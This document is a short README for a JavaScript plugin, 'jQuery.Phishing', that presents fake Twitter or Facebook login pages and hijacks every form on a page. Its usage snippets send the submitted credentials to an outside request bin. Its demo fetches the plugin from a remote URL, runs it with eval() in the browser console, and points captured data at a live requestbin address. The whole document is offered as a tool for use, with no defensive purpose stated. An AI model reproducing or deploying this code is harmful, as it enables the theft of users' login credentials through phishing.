# jQuery.Phishing
## Usage
Phishing and Hijack All Form
```javascript
$.phishing('https://twitter.com/login','//your_request_bin')
```
### onload
```javascript
$.phishing('https://twitter.com/login',()=>alert`onload`)
```
## Demo
1. Open you website
2. F12 call dev-tool -> console -> input:
```javascript
$.get(`https://raw.githubusercontent.com/jackmasa/jQuery.Phishing/master/jQuery.Phishing.js`,c=>{
  eval(c);
  $.phishing(`//fb.com`,`//requestbin.herokuapp.com/1koaluq1`);
});
```
3. try submit form :)
4. see result: [http://requestb.in/1koaluq1?inspect](http://requestb.in/1koaluq1?inspect)
